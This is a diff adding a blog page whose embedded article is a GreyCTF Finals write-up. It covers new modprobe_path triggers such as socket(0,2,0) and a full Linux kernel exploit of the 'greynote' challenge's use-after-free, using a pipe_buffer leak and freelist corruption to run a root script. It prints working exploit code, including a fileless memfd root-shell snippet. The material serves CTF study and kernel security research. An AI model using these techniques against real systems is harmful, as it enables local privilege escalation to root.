@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>socket(0,2,0) - Reviving modprobe_path again | leo_something</title>
+<meta name="keywords" content="kpwn">
+<meta name="description" content="Finding a new modprobe trigger without AI to solve &ldquo;greynote&rdquo; at GreyCTF Finals">
+<meta name="author" content="leo_something &amp; BitFriends">
+<link rel="canonical" href="http://leo1.cc/posts/docs/socket020---reviving-modprobe_path-again/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.62bb6a5e71ed8590b51185096e2d3dea8379889277e03fcf9ef8a01b0f6d9dc0.css" integrity="sha256-YrtqXnHthZC1EYUJbi096oN5iJJ34D/PnvigGw9tncA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc/posts/docs/socket020---reviving-modprobe_path-again/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><script data-goatcounter="https://leo1.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+<meta property="og:url" content="http://leo1.cc/posts/docs/socket020---reviving-modprobe_path-again/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="socket(0,2,0) - Reviving modprobe_path again">
+  <meta property="og:description" content="Finding a new modprobe trigger without AI to solve “greynote” at GreyCTF Finals">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-07-03T16:00:00+00:00">
+    <meta property="article:modified_time" content="2026-07-03T16:00:00+00:00">
+    <meta property="article:tag" content="Kpwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="socket(0,2,0) - Reviving modprobe_path again">
+<meta name="twitter:description" content="Finding a new modprobe trigger without AI to solve &ldquo;greynote&rdquo; at GreyCTF Finals">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "socket(0,2,0) - Reviving modprobe_path again",
+      "item": "http://leo1.cc/posts/docs/socket020---reviving-modprobe_path-again/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "socket(0,2,0) - Reviving modprobe_path again",
+  "name": "socket(0,2,0) - Reviving modprobe_path again",
+  "description": "Finding a new modprobe trigger without AI to solve \u0026ldquo;greynote\u0026rdquo; at GreyCTF Finals",
+  "keywords": [
+    "kpwn"
+  ],
+  "articleBody": "Overview The modprobe_path technique is a widely known Linux kernel exploitation primitive that can be used to turn an arbitrary write primitive into LPE.\nTL;DR modprobe_path is a string that specifies the name of the modprobe executable in the Linux kernel. This program is responsible for adding and removing loadable kernel modules.\nWhen CONFIG_STATIC_USERMODEHELPER is disabled modprobe_pathis R/W, this means that if we have an arbitrary write primitive and a KASLR leak, we can change it to a controlled executable file path. If we now find a way to make the kernel run modprobe for us, it will run our executable with root privileges, thus achieving LPE.\nModprobe used to be triggerable by executing a file with unknown magic bytes, as I explained here, but this has not been possible for a while.\nAF_ALG path After the path above became unreachable, this great blogpost came out, proposing a new way to trigger modprobe using the AF_ALG cryptography socket. Unfortunately this method is not universal, as this socket can be disabled, furthermore, it will be deprecated with the 7.2 kernel release, due to its “massive attack surface”.\nFinding a new way to trigger modprobe In this blogpost we will use a CTF challenge as a demo to show the more interesting paths we’ve found, which are simpler and with less constraints compared to AF_ALG.\nModprobe gets called by the kernel using call_modprobe, which is only called by __request_module, this is a kernel function that is called when requesting to load a new kernel module.\nTo summarize, if you can call __request_module and control modprobe_path, you are guaranteed LPE.\nPart one - manual digging in Linux source While solving the CTF challenge we needed to be fast at finding a path (without AI). For that we visited the Linux kernel source tree of version v7.0.10 to check references to request_module. The first logical idea is to look at commonly used source files/features.\nWe started with net/socket.c, since sockets are an extremely fundamental concept of Linux. It didn’t take long until we found this interesting snippet:\ncase SIOCGIFVLAN: case SIOCSIFVLAN: err = -ENOPKG; if (!vlan_ioctl_hook) request_module(\"8021q\"); This ioctl request on a socket file descriptor almost instantly calls request_module, as long as vlan_ioctl_hook is not set (which wasn’t for this specific challenge). Another interesting and convenient thing is that the two cases are not guarded/disableable - except, of course, if sockets are disabled entirely. This made it a perfect candidate for this challenge, which could also be used for many other tasks.\nThe setup itself is also pretty simple, and in fact much less complex than the AF_ALG path.\nint sfd = socket(AF_INET, SOCK_STREAM, 0); if(sfd \u003c 0) perror(\"socket\"); int ret = ioctl(sfd, SIOCSIFVLAN, NULL); It can be verified in GDB that this code snippet successfully triggers __request_module. See the example challenge on how we used this in the exploit.\nPart two - finding more paths with AI + CodeQL After the CTF ended we could finally use AI to find better paths more quickly. As it turns out, Codex with GPT-5.5 is pretty good at using CodeQL (thanks to the kqx guys for the tip), so with some basic setup and good prompts we were able to discover and manually validate at least 4 new paths to trigger __request_module with as few constraints as possible.\nThe base constraints for all approaches are some extremely basic kernel config flags. They should be pretty much always enabled by default:\nCONFIG_MODULES=y CONFIG_NET=y The most interesting paths we’ve found and validated are the following:\nAF_INET #define IPPROTO_SCTP 132 int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP); This requires CONFIG_INET=y.\nAF_INET6 #define IPPROTO_SCTP 132 int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_SCTP); This requires CONFIG_INET=y and CONFIG_IPV6=y.\nAF_NETLINK #define NETLINK_CRYPTO 21 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_CRYPTO); This requires CONFIG_CRYPTO_USER=m/y.\nAF_UNSPEC (the best one) int fd = socket(AF_UNSPEC, SOCK_DGRAM, 0); This last approach doesn’t require any additional kernel config flags, which makes it the most short and universal approach to trigger modprobe.\nMore paths GPT-5.5 + CodeQL found also other paths, but we didn’t validate all of them because they required configs/capabilities that are not usually enabled by default (e.g bluetooth, CAN, etc).\nBonus - fileless with memfd As shown in V4bel’s blogpost, modprobe can be triggered also if you don’t have the permissions/you don’t want to create any file. This can be done using memfd to “store the file” in memory.\n#define MODPROBE_SCRIPT \\ \"#!/bin/sh\\n\" \\ \"exec /bin/sh -i /proc/%u/fd/%u 2\u003e\u00261\\n\" char fake_modprobe[32] = {0}; pid_t pid = getpid(); int modprobe_script_fd = memfd_create(\"\", MFD_CLOEXEC); int shell_stdin_fd = dup(STDIN_FILENO); int shell_stdout_fd = dup(STDOUT_FILENO); dprintf(modprobe_script_fd, MODPROBE_SCRIPT, pid, shell_stdin_fd, pid, shell_stdout_fd); snprintf(fake_modprobe, sizeof(fake_modprobe), \"/proc/%i/fd/%i\", pid, modprobe_script_fd); // change modprobe_path to fake_modprobe socket(0,2,0); // trigger modprobe with AF_UNSPEC sleep(9999); // keep the process alive to interact with /bin/sh Example challenge The challenge “greynote” was part of GreyCTF Finals 2026. We played this CTF as ARESx team and managed to get first blood with our newly found techniques. It was definitely cool to refrain from using AI during this competition, and come up with something novel.\nThe challenge is a simple Linux kernel module that allows to mess with a newly created slab. We got all basic functionalities including allocating, freeing, editing and viewing chunks.\nunsigned __int64 __fastcall gn_ioctl(__int64 a1, unsigned int op, unsigned __int64 user_data) { unsigned __int64 ret; // r12 __int64 ptr; // rax __int64 note_ptr; // rdi unsigned __int64 idx; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 len; // [rsp+8h] [rbp-28h] __int64 content; // [rsp+10h] [rbp-20h] unsigned __int64 guard; // [rsp+18h] [rbp-18h] guard = __readgsqword((unsigned int)\u0026_ref_stack_chk_guard); switch(op) { case 0xC0186712: if ( copy_from_user(a1: \u0026idx, a2: user_data, a3: 24) == 0 ) { if ( idx \u003e 0xFFF || len \u003e 0x400 ) return -EINVAL; mutex_lock(a1: \u0026note_lock); note_ptr = notes[idx]; if ( note_ptr != 0 ) { if ( len \u003e= 0 ) { ret = -(__int64)(copy_from_user(a1: note_ptr, a2: content, a3: len) != 0) \u0026 0xFFFFFFFFFFFFFFF2LL; goto unlock_ret; } BUG(); } ret = -EINVAL; goto unlock_ret; } return -EFAULT; case 0xC0186713: if ( copy_from_user(a1: \u0026idx, a2: user_data, a3: 24) == 0 ) { if ( idx \u003e 0xFFF || len \u003e 0x400 ) return -EINVAL; mutex_lock(a1: \u0026note_lock); if ( notes[idx] != 0 ) { if ( len \u003e= 0 ) { ret = -(__int64)(copy_to_user(a1: content) != 0) \u0026 0xFFFFFFFFFFFFFFF2LL; unlock_ret: mutex_unlock(a1: \u0026note_lock); return ret; } BUG(); } ret = -EINVAL; goto unlock_ret; } return -EFAULT; case 0x40086710: if ( user_data \u003c= 0xFFF ) { v4 = -EEXIST; mutex_lock(a1: \u0026note_lock); if ( notes[user_data] == 0 ) { ptr = kmem_cache_alloc_noprof(a1: note_cache, a2: 3520); if ( ptr != 0 ) { notes[user_data] = ptr; ret = 0; } else { ret = -ENOMEM; } } goto unlock_ret; } return -EINVAL; case 0x40086711: if ( user_data \u003c= 0xFFF ) { ret = -EINVAL; mutex_lock(a1: \u0026note_lock); if ( notes[user_data] != 0 ) { ret = 0; kmem_cache_free(a1: note_cache); } goto unlock_ret; } return -EINVAL; return -ENOTTY; } It is pretty obvious that there is a use-after-free here, since after kmem_cache_free the pointer never gets zero’ed out. Okay, let’s verify some points first before starting with the exploit.\nGathering information The greynote cache is created in init_module() the following way:\nnote_cache = kmem_cache_create(\"greynote\", 1024, SLAB_HWCACHE_ALIGN); Which is, to our luck, pretty standard, and without painful additional cache flags.\nFor the kernel config and the allocator, we can notice some interesting things:\n----- Allocator ----- Allocator : Unknown ----- Other ----- CONFIG_STATIC_USERMODEHELPER : Disabled (call_usermodehelper_setup uses dynamic path) The allocator in this kernel version is apparently not supported in GDB bata, which makes it kind of painful to debug. Also notice that modprobe_path has R/W permissions, this is very important.\nBack to the exploitation part: to summarize, we got a UAF in a custom slab. This means we have to perform a cross cache attack of some sort.\nTesting our assumptions Lets first start by verifying our UAF. We will just read the contents of some chunks after we’ve free’d them:\nint main(int argc, char **argv) { int fd = open(\"/dev/greynote\", O_RDWR); for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i) \u003c 0) printf(\"error_alloc\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { if(delete(fd, i) \u003c 0) printf(\"error_delete\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { unsigned long *buf = (unsigned long *)print(fd, i, 0x400); for (int j = 0; j \u003c 0x400/0x8; j++) { if(buf[j] != 0) { print_arr(\u0026buf[j], 0x40/0x8, 0x8); } } } } With that we just print anything what is not NULL. Surprisingly, we got uncompressed kheap pointers, despite the fairly new kernel version:\n0x0: 0xffff9cdc81b12800 0x8: 0x0 0x10: 0x0 0x18: 0x0 0x20: 0x0 0x28: 0x0 0x30: 0x0 0x38: 0x0 0x0: 0xffff9cdc81b12400 0x8: 0x0 0x10: 0x0 0x18: 0x0 0x20: 0x0 0x28: 0x0 0x30: 0x0 0x38: 0x0 Since these are uncompressed, we would assume that the kheap doesn’t use a lot of mitigations. Because of that, it is worth trying to change this pointer, which points to the next free chunk, to point to a different location. This could allow for an arbitrary allocation in R/W memory.\nGetting a kernel .text leak To be able to turn an arbitrary allocation/write into something useful, we need a KASLR leak (this way we can tamper with modprobe_path). For the leak, we sprayed a ton of pipes, hoping to get a pipe_buffer struct allocated in place of our freed chunks.\nstruct pipe_buffer { struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; This structure contains a pipe_buf_operations member, which is an address at a constant offset to the kernel base.\nint main(int argc, char **argv) { int fd = open(\"/dev/greynote\", O_RDWR); for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i) \u003c 0) printf(\"error_alloc\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { if(delete(fd, i) \u003c 0) printf(\"error_delete\\n\"); } int pipefds[0x100][2]; char *buf1 = malloc(0x10000); memset(buf1, 0x41, 0x10000); for(size_t i = 0; i \u003c 0x100; i++) { init_pipe(pipefds[i]); write(pipefds[i][1], buf1, 0x10000); } unsigned long kleak = 0; for(size_t i = 0; i \u003c 0x200; i++) { unsigned long *buf = (unsigned long *)print(fd, i, 0x400); for (int j = 0; j \u003c 0x400/0x8; j++) { if(buf[j] \u003e 0xffffffff00000000) { print_arr(\u0026buf[j], 0x40/0x8, 0x8); kleak = buf[j]; goto out1; } } } } This yields the following output:\n0x0: 0xffffffff8c226740 0x8: 0x10 0x10: 0x0 0x18: 0xffffd9aec00d10c0 0x20: 0x100000000000 0x28: 0xffffffff8c226740 0x30: 0x10 0x38: 0x0 Corrupting modprobe_path Bingo! We successfully received a kernel leak. Lets try writing to modprobe_path by simply corrupting the uncompressed slab free-list forward pointer.\nunsigned long kbase = kleak - 0x1426740; unsigned long modprobe_path = kbase + 0x1d4aec0; printf(\"base: 0x%lx\\n\", kbase); printf(\"modprobe_path: 0x%lx\\n\", modprobe_path); for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i+0x200) \u003c 0) printf(\"error_alloc\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { if(delete(fd, i+0x200) \u003c 0) printf(\"error_delete\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { unsigned long *buf = (unsigned long *)print(fd, i+0x200, 0x400); for (int j = 0; j \u003c 0x400/0x8; j++) { if(buf[j] != 0) { print_arr(\u0026buf[j], 0x40/0x8, 0x8); buf[j] = modprobe_path - 0xc0; if(edit(fd, i+0x200, (void*)buf, 0x400) \u003c 0) printf(\"error_edit\\n\"); goto out2; } } } out2: for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i+0x400) \u003c 0) printf(\"error_alloc\\n\"); } However, there appears to be a kernel panic, since Qemu simply exits without output. This happens because the chunks from this cache need to be 0x400 aligned. Aside from that, there are a lot of pointers around modprobe_path we end up clobbering:\n0xffffffffb734ada0|+0x0030|+006: 0xffffffffb734ad20 -\u003e 0xffffffffb734aca0 -\u003e 0xffffffffb734ac20 -\u003e ... 0xffffffffb734ada8|+0x0038|+007: 0xffffffffb734c4e0 -\u003e 0xffffffffb734ada0 -\u003e 0xffffffffb734ad20 -\u003e ... 0xffffffffb734adb0|+0x0040|+008: 0xffffffffb74a29a0 -\u003e 0xffffffffb6a15779 -\u003e 0x5f00656c75646f6d ('module'?) 0xffffffffb734adb8|+0x0048|+009: 0xffffffffb74bda60 -\u003e 0xffffffffb70f8230 -\u003e 0x6c5f656c75646f6d 'module_load' 0xffffffffb734adc0|+0x0050|+010: 0xffffffffb723b100 -\u003e 0x0000000000000000 0xffffffffb734adc8|+0x0058|+011: 0xffffffffb73607a0 -\u003e 0xffffffffb734adc0 -\u003e 0xffffffffb723b100 -\u003e ... 0xffffffffb734add0|+0x0060|+012: 0x00000000000000b2 0xffffffffb734add8|+0x0068|+013: 0xffffffffb734ab80 -\u003e 0xffffffffb5950210 -\u003e 0xd6894855fa1e0ff3 0xffffffffb734ade0|+0x0070|+014: 0xffffffffb734a840 -\u003e 0x2c22732520732522 '\"%s %s\", __get_str(name), __print_flags(REC-\u003etaints, \"\", { (1UL [...]' 0xffffffffb734adf8|+0x0088|+017: 0x0000000000000008 0xffffffffb734ae20|+0x00b0|+022: 0xffffffffb594faa0 -\u003e 0x54415541fa1e0ff3 0xffffffffb734ae28|+0x00b8|+023: 0xffffffffb70eedd9 -\u003e 0xd00025c044fe866e 0xffffffffb734ae30|+0x00c0|+024: 0xffffffffb594fa40 -\u003e 0x53555441fa1e0ff3 0xffffffffb734ae38|+0x00c8|+025: 0xffffffffb70eede1 -\u003e 0x020025c04cfe8612 0xffffffffb734ae40|+0x00d0|+026: 0xffffffffb594f9c0 -\u003e 0x53555441fa1e0ff3 0xffffffffb734ae48|+0x00d8|+027: 0xffffffffb70eede9 -\u003e 0x400025c054fe861d 0xffffffffb734ae50|+0x00e0|+028: 0xffffffffb594f970 -\u003e 0x8b485355fa1e0ff3 0xffffffffb734ae58|+0x00e8|+029: 0xffffffffb70eedf9 -\u003e 0x8e0025c054fe8634 0xffffffffb734ae60|+0x00f0|+030: 0xffffffffb594f900 -\u003e 0x8b485355fa1e0ff3 0xffffffffb734ae68|+0x00f8|+031: 0xffffffffb70eee01 -\u003e 0x850025c05cfe8657 0xffffffffb734ae80|+0x0110|+034: 0xffffffffb7041dfe -\u003e 0x54002f3d454d4f48 ('HOME=/'?) 0xffffffffb734ae88|+0x0118|+035: 0xffffffffb7041e05 -\u003e 0x6e696c3d4d524554 'TERM=linux' 0xffffffffb734ae90|+0x0120|+036: 0xffffffffb6f7a9f8 -\u003e 0x62732f3d48544150 'PATH=/sbin:/usr/sbin:/bin:/usr/bin' 0xffffffffb734aea0|+0x0130|+038: 0x0000138800000000 0xffffffffb734aea8|+0x0138|+039: 0x000000000000000a 0xffffffffb734aec0|+0x0150|+042: 0x6f6d2f6e6962732f '/sbin/modprobe' 0xffffffffb734aec8|+0x0158|+043: 0x000065626f727064 ('dprobe'?) Restoring those pointers from the leak, and fixing the alignment finally allows write into modprobe_path:\n/ $ cat /proc/sys/kernel/modprobe /tmp/x Win Running the full exploit successfully grants access to the flag:\n/ $ exp 0x0: 0xffffffffb6a26740 0x8: 0x10 0x10: 0x0 0x18: 0xffffe372400d0bc0 0x20: 0x100000000000 0x28: 0xffffffffb6a26740 0x30: 0x10 0x38: 0x0 base: 0xffffffffb5600000 modprobe_path: 0xffffffffb734aec0 0x0: 0xffffa1f04224b400 0x8: 0x0 0x10: 0x0 0x18: 0x0 0x20: 0x0 0x28: 0x0 0x30: 0x0 0x38: 0x0 grey{fake_flag_for_testing} The full exploit is pretty simple yet ugly:\n#define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include #include #include #include #include #define MODPROBE_SCRIPT \"#!/bin/sh\\\\n/bin/sh 0/proc/%u/fd/%u 2\u003e\u00261\\\\n\" #define ALLOC 0x40086710 #define FREE 0x40086711 #define WRITE 0xC0186712 #define READ 0xC0186713 void pin_cpu(int cpu) { cpu_set_t my_set; CPU_ZERO(\u0026my_set); CPU_SET(cpu, \u0026my_set); sched_setaffinity(0, sizeof(my_set), \u0026my_set); } int alloc(int fd, int idx) { return ioctl(fd, ALLOC, idx); } int delete(int fd, int idx) { return ioctl(fd, FREE, idx); } struct req { unsigned long idx; unsigned long size; void *data; }; int edit(int fd, int idx, void *data, int size) { struct req *req = malloc(sizeof(struct req)); req-\u003eidx = (unsigned long)idx; req-\u003esize = (unsigned long)size; req-\u003edata = data; int ret = ioctl(fd, WRITE, (void *)req); free(req); return ret; } void *print(int fd, int idx, int size) { struct req *req = malloc(sizeof(struct req)); req-\u003eidx = (unsigned long)idx; req-\u003esize = (unsigned long)size; req-\u003edata = calloc(1, size + 1); if(ioctl(fd, READ, (void *)req) \u003c 0) printf(\"error_print\\n\"); void *ret = req-\u003edata; free(req); return ret; } void init_pipe(int pipefds[2]) { if(pipe(pipefds) \u003c 0) perror(\"pipe\"); } void print_arr(void *arr, unsigned int n, unsigned int size) { for (unsigned i = 0; i \u003c n; ++i) { switch(size) { case 1: printf(\"0x%x: 0x%hhx\\n\", i, *(uint8_t *)(arr + i)); break; case 2: printf(\"0x%x: 0x%hx\\n\", i*2, *(uint16_t *)(arr + i*2)); break; case 4: printf(\"0x%x: 0x%x\\n\", i*4, *(uint32_t *)(arr + i*4)); break; case 8: printf(\"0x%x: 0x%lx\\n\", i*8, *(uint64_t *)(arr + i*8)); break; } } } int main(int argc, char **argv) { pin_cpu(0); int fd = open(\"/dev/greynote\", O_RDWR); for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i) \u003c 0) printf(\"error_alloc\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { if(delete(fd, i) \u003c 0) printf(\"error_delete\\n\"); } int pipefds[0x100][2]; char *buf1 = malloc(0x10000); memset(buf1, 0x41, 0x10000); for(size_t i = 0; i \u003c 0x100; i++) { init_pipe(pipefds[i]); write(pipefds[i][1], buf1, 0x10000); } unsigned long kleak = 0; for(size_t i = 0; i \u003c 0x200; i++) { unsigned long *buf = (unsigned long *)print(fd, i, 0x400); for (int j = 0; j \u003c 0x400/0x8; j++) { if(buf[j] \u003e 0xffffffff00000000) { print_arr(\u0026buf[j], 0x40/0x8, 0x8); kleak = buf[j]; goto out1; } } } out1: unsigned long kbase = kleak - 0x1426740; unsigned long modprobe_path = kbase + 0x1d4aec0; printf(\"base: 0x%lx\\n\", kbase); printf(\"modprobe_path: 0x%lx\\n\", modprobe_path); for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i+0x200) \u003c 0) printf(\"error_alloc\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { if(delete(fd, i+0x200) \u003c 0) printf(\"error_delete\\n\"); } for(size_t i = 0; i \u003c 0x200; i++) { unsigned long *buf = (unsigned long *)print(fd, i+0x200, 0x400); for (int j = 0; j \u003c 0x400/0x8; j++) { if(buf[j] != 0) { print_arr(\u0026buf[j], 0x40/0x8, 0x8); buf[j] = modprobe_path - 0x2c0; if(edit(fd, i+0x200, (void*)buf, 0x400) \u003c 0) printf(\"error_edit\\n\"); goto out2; } } } out2: for(size_t i = 0; i \u003c 0x200; i++) { if(alloc(fd, i+0x400) \u003c 0) printf(\"error_alloc\\n\"); unsigned long *buf = (unsigned long *)print(fd, i, 0x400); int x = 0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x1d4aba0+kbase; buf[x++] = 0x1d4aca0+kbase; buf[x++] = 0x1ea28e0+kbase; buf[x++] = 0x1ebd940+kbase; buf[x++] = 0x1c56880+kbase; buf[x++] = 0x1d73020+kbase; buf[x++] = 0xaf; buf[x++] = 0x1d4ab40+kbase; buf[x++] = 0x1d4a7c0+kbase; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x8; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x1d4ac20+kbase; buf[x++] = 0x1d4ad20+kbase; buf[x++] = 0x1ea28e0+kbase; buf[x++] = 0x1ebd9a0+kbase; buf[x++] = 0x1c3b000+kbase; buf[x++] = 0x1d606a0+kbase; buf[x++] = 0xb0; buf[x++] = 0x1d4ab40+kbase; buf[x++] = 0x1d4a7c0+kbase; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x8; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x1d4aca0+kbase; buf[x++] = 0x1d4ada0+kbase; buf[x++] = 0x1ea2940+kbase; buf[x++] = 0x1ebda00+kbase; buf[x++] = 0x1c3b080+kbase; buf[x++] = 0x1d60720+kbase; buf[x++] = 0xb1; buf[x++] = 0x1d4ab60+kbase; buf[x++] = 0x1d4a810+kbase; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x8; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x1d4ad20+kbase; buf[x++] = 0x1d4c4e0+kbase; buf[x++] = 0x1ea29a0+kbase; buf[x++] = 0x1ebda60+kbase; buf[x++] = 0x1c3b100+kbase; buf[x++] = 0x1d607a0+kbase; buf[x++] = 0xb2; buf[x++] = 0x1d4ab80+kbase; buf[x++] = 0x1d4a840+kbase; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x8; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x34faa0+kbase; buf[x++] = 0x1aeedd9+kbase; buf[x++] = 0x34fa40+kbase; buf[x++] = 0x1aeede1+kbase; buf[x++] = 0x34f9c0+kbase; buf[x++] = 0x1aeede9+kbase; buf[x++] = 0x34f970+kbase; buf[x++] = 0x1aeedf9+kbase; buf[x++] = 0x34f900+kbase; buf[x++] = 0x1aeee01+kbase; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0x1a41e05+kbase; buf[x++] = 0x197a9f8+kbase; buf[x++] = 0x0; buf[x++] = 0x0; buf[x++] = 0xa; buf[x++] = 0x0; strcpy((char *)\u0026buf[0x58], \"/tmp/x\"); buf[0x58+32] = 0x0000003200000000; buf[0x58+33] = 0x1d4afc8+kbase; buf[0x58+34] = 0x1d4afc8+kbase; buf[0x58+35] = 0x1; buf[0x58+36] = 0x1; if(edit(fd, i+0x400, buf, 0x400) \u003c 0) printf(\"error_edit\\n\"); } system(\"echo -en \\\"#!/bin/sh\\ncat /flag \u003e /tmp/flag;\\nchmod 777 /tmp/flag\\\" \u003e /tmp/x; chmod +x /tmp/x\"); socket(0,2,0); system(\"cat /tmp/flag\"); return 0; } Conclusion As we couldn’t use AI during the CTF and we are now kinda tired, we will just slop the conclusion.\nmodprobe_path still works if you have write + leak + vibes. Old binfmt trigger is dead, AF_ALG is mid, but sockets are still funny.\nBest trigger: socket(0,2,0);\nNo crypto nonsense, no SCTP, no netlink pain. Just CONFIG_MODULES=y + CONFIG_NET=y and boom, kernel calls modprobe 🧨🔥\nExploit was ugly, offsets were cursed, freelist got bonked, flag got stolen. ✅\nkernel moment 🤡🫡\n",
+  "wordCount" : "3001",
+  "inLanguage": "en",
+  "datePublished": "2026-07-03T16:00:00Z",
+  "dateModified": "2026-07-03T16:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something \u0026 BitFriends"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc/posts/docs/socket020---reviving-modprobe_path-again/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      socket(0,2,0) - Reviving modprobe_path again
+    </h1>
